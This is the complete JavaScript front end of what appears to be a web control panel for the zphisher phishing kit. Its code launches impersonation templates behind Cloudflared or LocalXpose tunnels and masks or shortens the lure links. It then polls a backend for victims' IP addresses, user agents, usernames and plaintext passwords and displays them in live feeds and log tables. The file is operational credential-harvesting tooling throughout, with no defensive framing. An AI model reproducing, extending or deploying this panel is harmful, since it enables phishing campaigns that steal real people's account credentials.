(async function () {
  'use strict';

  await I18n.init();
  const t = I18n.t.bind(I18n);

  const API = '/api';
  let templates = [];
  let activeSession = null;
  let pollTimer = null;
  let selectedTemplate = null;
  let currentView = 'dashboard';
  let tokenSaved = false;

  const $ = (sel) => document.querySelector(sel);
  const $$ = (sel) => document.querySelectorAll(sel);

  async function api(path, options = {}) {
    const res = await fetch(API + path, {
      headers: { 'Content-Type': 'application/json', ...(options.headers || {}) },
      ...options,
    });
    const data = await res.json().catch(() => ({}));
    if (!res.ok && !data.error) data.error = res.statusText;
    return data;
  }

  function toast(msg, isError = false) {
    const el = $('#toast');
    el.textContent = msg;
    el.classList.toggle('error', isError);
    el.hidden = false;
    clearTimeout(el._t);
    el._t = setTimeout(() => { el.hidden = true; }, 4000);
  }

  function esc(s) {
    const d = document.createElement('div');
    d.textContent = s ?? '';
    return d.innerHTML;
  }

  function copyText(text) {
    navigator.clipboard.writeText(text).then(() => toast(t('toast.copied')));
  }

  function formatDate(iso) {
    if (!iso) return '—';
    try {
      return new Date(iso).toLocaleString(I18n.getDateLocale(), {
        dateStyle: 'short',
        timeStyle: 'medium',
      });
    } catch {
      return iso;
    }
  }

  function tStatus(status) {
    const key = 'status.' + (status || '').toLowerCase();
    const tr = t(key);
    return tr !== key ? tr : status;
  }

  function setPage(view) {
    currentView = view;
    $('#page-title').textContent = t(`page.${view}.title`);
    const sub = $('#page-subtitle');
    if (sub) sub.textContent = t(`page.${view}.sub`);
  }

  function emptyState(icon, textKey) {
    return `<div class="empty-state"><i class="fas ${icon}"></i><p>${esc(t(textKey))}</p></div>`;
  }

  function updateSessionUI() {
    const badge = $('#session-badge');
    const stopBtn = $('#btn-stop-global');
    if (activeSession) {
      badge.textContent = t('session.active');
      badge.className = 'badge badge-live';
      stopBtn.hidden = false;
      renderUrls(activeSession);
      startPolling();
    } else {
      badge.textContent = t('session.none');
      badge.className = 'badge badge-idle';
      stopBtn.hidden = true;
      $('#urls-panel').hidden = true;
      stopPolling();
    }
    renderRailSession();
  }

  function renderRailSession() {
    const wrap = $('#rail-session');
    const body = $('#rail-session-body');
    if (!wrap || !body) return;
    if (!activeSession) {
      wrap.classList.remove('active');
      body.className = 'rail-empty';
      body.textContent = t('rail.session_none');
      return;
    }
    wrap.classList.add('active');
    body.className = 'rail-kv';
    body.innerHTML = `
      <div class="rail-kv-row"><span>${esc(t('rail.label.template'))}</span><strong>${esc(activeSession.template_label || activeSession.template_id)}</strong></div>
      <div class="rail-kv-row"><span>${esc(t('rail.label.tunnel'))}</span><span class="pill-tunnel">${esc(activeSession.tunnel)}</span></div>
      <div class="rail-kv-row"><span>${esc(t('rail.label.port'))}</span><strong>${esc(String(activeSession.port || '8080'))}</strong></div>
      <div class="rail-kv-row"><span>${esc(t('table.status'))}</span><strong>${esc(tStatus(activeSession.status || 'running'))}</strong></div>
    `;
  }

  async function refreshRailRecent() {
    const box = $('#rail-recent');
    if (!box) return;
    const [ips, creds] = await Promise.all([
      api('/captures/ips'),
      api('/captures/credentials'),
    ]);
    const items = [];
    if (ips.ok) {
      ips.items.slice(0, 5).forEach((r) => {
        items.push({ type: 'ip', label: r.ip, time: r.captured_at });
      });
    }
    if (creds.ok) {
      creds.items.slice(0, 5).forEach((r) => {
        items.push({
          type: 'cred',
          label: r.username || '—',
          time: r.captured_at,
        });
      });
    }
    items.sort((a, b) => new Date(b.time) - new Date(a.time));
    const top = items.slice(0, 6);
    if (!top.length) {
      box.className = 'rail-recent-list rail-empty';
      box.textContent = t('rail.recent_none');
      return;
    }
    box.className = 'rail-recent-list';
    box.innerHTML = top
      .map((it) => {
        const typeLabel = it.type === 'ip' ? t('rail.recent_ip') : t('rail.recent_login');
        return `<div class="rail-recent-item type-${it.type}">
          <div class="type">${esc(typeLabel)}</div>
          <strong>${esc(it.label)}</strong>
          <time>${formatDate(it.time)}</time>
        </div>`;
      })
      .join('');
  }

  function refreshRailStats() {
    const ips = $('#stat-ips')?.textContent || '0';
    const creds = $('#stat-creds')?.textContent || '0';
    const rip = $('#rail-stat-ips');
    const rc = $('#rail-stat-creds');
    const rt = $('#rail-stat-tpl');
    if (rip) rip.textContent = ips;
    if (rc) rc.textContent = creds;
    if (rt) {
      let count = 0;
      templates.forEach((g) => { count += g.templates.length; });
      rt.textContent = String(count);
    }
  }

  async function refreshRail() {
    renderRailSession();
    refreshRailStats();
    await refreshRailRecent();
  }

  function gotoView(view) {
    const btn = document.querySelector(`.nav-item[data-view="${view}"]`);
    if (btn) btn.click();
  }

  function renderUrls(session) {
    const panel = $('#urls-panel');
    const list = $('#url-list');
    panel.hidden = false;
    const items = [
      [t('url.local'), session.local_url || `http://127.0.0.1:${session.port}`],
      [t('url.primary'), session.primary_url],
    ];
    if (session.short_url) items.push([t('url.short'), session.short_url]);
    if (session.masked_url) items.push([t('url.mask'), session.masked_url]);

    list.innerHTML = items
      .filter(([, u]) => u)
      .map(
        ([label, url]) => `
      <div class="url-item">
        <span class="url-tag">${esc(label)}</span>
        <code>${esc(url)}</code>
        <button type="button" class="btn btn-icon btn-secondary" data-copy="${esc(url)}" title="${esc(t('btn.copy'))}"><i class="fas fa-copy"></i></button>
      </div>`
      )
      .join('');

    list.querySelectorAll('[data-copy]').forEach((btn) => {
      btn.addEventListener('click', () => copyText(btn.getAttribute('data-copy')));
    });
  }

  async function loadStatus() {
    const data = await api('/status');
    if (!data.ok) return;
    $('#stat-version').textContent = 'v' + data.panel_version;
    $('#stat-php').textContent = data.php_version;
    const storage =
      data.storage_driver === 'sqlite' ? t('status.storage_sqlite') : t('status.storage_json');
    $('#sys-status').textContent = `${data.os} | ${storage} | core v${data.zphisher_version}`;
    activeSession = data.active_session;
    updateSessionUI();
  }

  async function loadStats() {
    const [ips, creds] = await Promise.all([
      api('/captures/ips'),
      api('/captures/credentials'),
    ]);
    if (ips.ok) $('#stat-ips').textContent = ips.items.length;
    if (creds.ok) $('#stat-creds').textContent = creds.items.length;
    refreshRailStats();
    refreshRailRecent();
  }

  async function loadTemplates() {
    const data = await api('/templates');
    if (!data.ok) return;
    templates = data.groups;
    renderTemplateGrid();
    fillQuickSelect();
    refreshRailStats();
  }

  function fillQuickSelect() {
    const sel = $('#quick-template');
    sel.innerHTML = '';
    templates.forEach((g) => {
      g.templates.forEach((tpl) => {
        const opt = document.createElement('option');
        opt.value = tpl.id;
        opt.textContent = `${g.name} — ${tpl.label}`;
        opt.dataset.mask = tpl.mask || '';
        sel.appendChild(opt);
      });
    });
  }

  function renderTemplateGrid(filter = '') {
    const grid = $('#template-grid');
    const q = filter.toLowerCase();
    grid.innerHTML = templates
      .map((g) => {
        const variants = g.templates.filter(
          (tpl) =>
            !q ||
            g.name.toLowerCase().includes(q) ||
            tpl.label.toLowerCase().includes(q) ||
            tpl.id.toLowerCase().includes(q)
        );
        if (!variants.length) return '';
        return `
        <div class="tpl-group">
          <div class="tpl-group-header"><i class="${g.icon}"></i> ${esc(g.name)}</div>
          ${variants
            .map(
              (tpl) =>
                `<button type="button" class="tpl-variant" data-id="${esc(tpl.id)}" data-label="${esc(g.name + ' — ' + tpl.label)}" data-mask="${esc(tpl.mask || '')}">${esc(tpl.label)}</button>`
            )
            .join('')}
        </div>`;
      })
      .join('');

    grid.querySelectorAll('.tpl-variant').forEach((btn) => {
      btn.addEventListener('click', () => openModal(btn.dataset));
    });
  }

  function openModal(ds) {
    selectedTemplate = { id: ds.id, label: ds.label, mask: ds.mask };
    $('#modal-title').textContent = ds.label;
    $('#modal-body').innerHTML = `
      <div class="form-row"><label>${esc(t('form.tunnel'))}</label>
        <select id="modal-tunnel">
          <option value="localhost">Localhost</option>
          <option value="cloudflared">Cloudflared</option>
          <option value="loclx">LocalXpose</option>
        </select>
      </div>
      <div class="form-row"><label>${esc(t('form.port'))}</label><input type="number" id="modal-port" value="8080" min="1024" max="9999"></div>
      <label class="checkbox"><input type="checkbox" id="modal-mask"> ${esc(t('form.mask_url'))}</label>
    `;
    $('#modal').hidden = false;
  }

  async function startSession(payload) {
    toast(t('toast.starting'));
    const data = await api('/session/start', {
      method: 'POST',
      body: JSON.stringify(payload),
    });
    if (!data.ok) {
      toast(data.error || t('toast.error'), true);
      return;
    }
    activeSession = data.session;
    toast(t('toast.started'));
    updateSessionUI();
    await loadStatus();
    $$('.nav-item').forEach((b) => b.classList.remove('active'));
    document.querySelector('[data-view="live"]').classList.add('active');
    $$('.view').forEach((v) => v.classList.remove('active'));
    $('#view-live').classList.add('active');
    setPage('live');
  }

  async function stopSession() {
    await api('/session/stop', { method: 'POST' });
    activeSession = null;
    toast(t('toast.stopped'));
    updateSessionUI();
    loadStatus();
  }

  function startPolling() {
    stopPolling();
    pollTimer = setInterval(pollCaptures, 1200);
  }

  function stopPolling() {
    if (pollTimer) clearInterval(pollTimer);
    pollTimer = null;
  }

  async function pollCaptures() {
    if (!activeSession) return;
    const data = await api('/capture/poll');
    if (!data.ok) return;
    data.new.ips.forEach((item) => appendFeed('live-ips', item, 'ip'));
    data.new.credentials.forEach((item) => appendFeed('live-creds', item, 'cred'));
    if (data.new.ips.length || data.new.credentials.length) {
      loadStats();
    }
  }

  function appendFeed(containerId, item, type) {
    const box = $('#' + containerId);
    if (box.classList.contains('empty')) {
      box.innerHTML = '';
      box.classList.remove('empty');
    }
    const isIp = type === 'ip';
    const el = document.createElement('div');
    el.className = `feed-item ${isIp ? 'ip-item' : 'cred-item'}`;
    if (isIp) {
      el.innerHTML = `
        <div class="feed-avatar"><i class="fas fa-globe"></i></div>
        <div class="feed-body">
          <span class="feed-badge">${esc(t('feed.new_ip'))}</span>
          <strong>${esc(item.ip)}</strong>
          <p>${esc(item.user_agent || '—')}</p>
          <time>${formatDate(item.captured_at)}</time>
        </div>`;
    } else {
      el.innerHTML = `
        <div class="feed-avatar"><i class="fas fa-key"></i></div>
        <div class="feed-body">
          <span class="feed-badge">${esc(t('feed.new_login'))}</span>
          <strong>${esc(item.username || '—')}</strong>
          <p><b>${esc(t('feed.password'))}:</b> ${esc(item.password || '—')}</p>
          <time>${formatDate(item.captured_at)}</time>
        </div>`;
    }
    box.prepend(el);
  }

  async function loadLogs() {
    const [creds, ips, hist] = await Promise.all([
      api('/captures/credentials'),
      api('/captures/ips'),
      api('/session/history'),
    ]);

    if (creds.ok) {
      $('#table-creds').innerHTML = creds.items.length
        ? `<table><thead><tr>
            <th>${t('table.id')}</th><th>${t('table.login')}</th><th>${t('table.password')}</th>
            <th>${t('table.session')}</th><th>${t('table.time')}</th>
          </tr></thead><tbody>${creds.items
            .map(
              (r) =>
                `<tr><td><strong>${r.id}</strong></td><td><code>${esc(r.username)}</code></td><td><code>${esc(r.password)}</code></td><td>${r.session_id ? '#' + r.session_id : '—'}</td><td>${formatDate(r.captured_at)}</td></tr>`
            )
            .join('')}</tbody></table>`
        : emptyState('fa-inbox', 'empty.creds');
    }

    if (ips.ok) {
      $('#table-ips').innerHTML = ips.items.length
        ? `<table><thead><tr>
            <th>${t('table.id')}</th><th>${t('table.ip')}</th><th>${t('table.device')}</th>
            <th>${t('table.session')}</th><th>${t('table.time')}</th>
          </tr></thead><tbody>${ips.items
            .map(
              (r) =>
                `<tr><td><strong>${r.id}</strong></td><td><code>${esc(r.ip)}</code></td><td style="max-width:220px;font-size:0.8rem;color:var(--text-soft)">${esc(r.user_agent)}</td><td>${r.session_id ? '#' + r.session_id : '—'}</td><td>${formatDate(r.captured_at)}</td></tr>`
            )
            .join('')}</tbody></table>`
        : emptyState('fa-wifi', 'empty.ips');
    }

    if (hist.ok) {
      $('#table-history').innerHTML = hist.sessions.length
        ? `<table><thead><tr>
            <th>${t('table.id')}</th><th>${t('table.template')}</th><th>${t('table.tunnel')}</th>
            <th>${t('table.link')}</th><th>${t('table.status')}</th><th>${t('table.started')}</th>
          </tr></thead><tbody>${hist.sessions
            .map((s) => {
              const st = (s.status || '').toLowerCase();
              return `<tr>
                <td><strong>${s.id}</strong></td>
                <td>${esc(s.template_label)}</td>
                <td><span class="url-tag" style="font-size:0.65rem">${esc(s.tunnel)}</span></td>
                <td><code style="max-width:180px;display:block;overflow:hidden;text-overflow:ellipsis">${esc(s.primary_url)}</code></td>
                <td><span class="status-pill ${st}">${esc(tStatus(s.status))}</span></td>
                <td>${formatDate(s.started_at)}</td>
              </tr>`;
            })
            .join('')}</tbody></table>`
        : emptyState('fa-clock', 'empty.history');
    }
    loadStats();
  }

  async function checkUpdate() {
    const data = await api('/tools/check-update');
    const el = $('#update-info');
    if (!data.ok) {
      el.textContent = t('settings.update_fail');
      return;
    }
    el.textContent = data.update_available
      ? t('settings.update_available', { latest: data.latest, current: data.current })
      : t('settings.update_none', { current: data.current });
  }

  function refreshTokenPlaceholder() {
    const inp = $('#setting-loclx-token');
    if (!inp) return;
    inp.placeholder = tokenSaved
      ? t('settings.token_saved_placeholder')
      : t('settings.token_placeholder');
  }

  function onLanguageChange() {
    I18n.applyDom();
    setPage(currentView);
    updateSessionUI();
    refreshTokenPlaceholder();
    checkUpdate();
    refreshRail();
    if (currentView === 'logs') loadLogs();
  }

  $$('.rail-quick-btn').forEach((btn) => {
    btn.addEventListener('click', () => gotoView(btn.dataset.goto));
  });

  // Navigation
  $$('.nav-item').forEach((btn) => {
    btn.addEventListener('click', () => {
      const view = btn.dataset.view;
      $$('.nav-item').forEach((b) => b.classList.remove('active'));
      btn.classList.add('active');
      $$('.view').forEach((v) => v.classList.remove('active'));
      $('#view-' + view).classList.add('active');
      setPage(view);
      if (view === 'logs') loadLogs();
    });
  });

  $$('.tab').forEach((tab) => {
    tab.addEventListener('click', () => {
      $$('.tab').forEach((x) => x.classList.remove('active'));
      $$('.tab-panel').forEach((p) => p.classList.remove('active'));
      tab.classList.add('active');
      $('#tab-' + tab.dataset.tab).classList.add('active');
    });
  });

  $('#template-search')?.addEventListener('input', (e) => renderTemplateGrid(e.target.value));
  $('#modal-close')?.addEventListener('click', () => { $('#modal').hidden = true; });
  $('#modal-start')?.addEventListener('click', () => {
    if (!selectedTemplate) return;
    $('#modal').hidden = true;
    startSession({
      template_id: selectedTemplate.id,
      tunnel: $('#modal-tunnel').value,
      port: parseInt($('#modal-port').value, 10),
      use_mask: $('#modal-mask').checked,
      mask_url: $('#modal-mask').checked ? selectedTemplate.mask : '',
    });
  });
  $('#quick-tunnel')?.addEventListener('change', (e) => {
    $('#loclx-row').hidden = e.target.value !== 'loclx';
  });
  $('#quick-mask')?.addEventListener('change', (e) => {
    $('#mask-row').hidden = !e.target.checked;
  });
  $('#btn-start')?.addEventListener('click', () => {
    const tpl = $('#quick-template');
    const opt = tpl.options[tpl.selectedIndex];
    startSession({
      template_id: tpl.value,
      tunnel: $('#quick-tunnel').value,
      port: parseInt($('#quick-port').value, 10),
      use_mask: $('#quick-mask').checked,
      mask_url: $('#quick-mask').checked
        ? $('#quick-mask-url').value || opt?.dataset?.mask || ''
        : '',
      loclx_region: $('#quick-loclx-region').value,
    });
  });
  $('#btn-stop-global')?.addEventListener('click', stopSession);
  $('#btn-refresh-logs')?.addEventListener('click', loadLogs);
  $('#btn-clear-logs')?.addEventListener('click', async () => {
    if (!confirm(t('confirm.clear'))) return;
    await api('/captures/clear', { method: 'POST' });
    toast(t('toast.cleared'));
    loadLogs();
  });
  $('#btn-save-settings')?.addEventListener('click', async () => {
    const token = $('#setting-loclx-token').value;
    const data = await api('/settings', {
      method: 'POST',
      body: JSON.stringify({ loclx_token: token }),
    });
    if (data.ok) tokenSaved = !!token;
    refreshTokenPlaceholder();
    toast(data.ok ? t('toast.saved') : data.error || t('toast.error'), !data.ok);
  });
  $('#btn-install-cf')?.addEventListener('click', async () => {
    toast(t('toast.cf_download'));
    const data = await api('/tools/install-cloudflared', { method: 'POST' });
    toast(data.ok ? t('toast.cf_installed') : data.error || t('toast.error'), !data.ok);
    loadStatus();
  });
  $('#btn-install-lx')?.addEventListener('click', async () => {
    toast(t('toast.lx_download'));
    const data = await api('/tools/install-loclx', { method: 'POST' });
    toast(data.ok ? t('toast.cf_installed') : data.error || t('toast.error'), !data.ok);
    loadStatus();
  });

  I18n.onChange(onLanguageChange);

  setPage('dashboard');
  await loadTemplates();
  await loadStatus();
  await loadStats();
  await refreshRail();
  await checkUpdate();
  const settings = await api('/settings');
  tokenSaved = !!settings.loclx_token_set;
  refreshTokenPlaceholder();

  if (activeSession) {
    const full = await api('/session/active');
    if (full.session) {
      activeSession = {
        ...full.session,
        local_url: `http://${full.session.host}:${full.session.port}`,
        primary_url: full.session.primary_url,
        short_url: full.session.short_url,
        masked_url: full.session.masked_url,
      };
      updateSessionUI();
    }
  }
})();
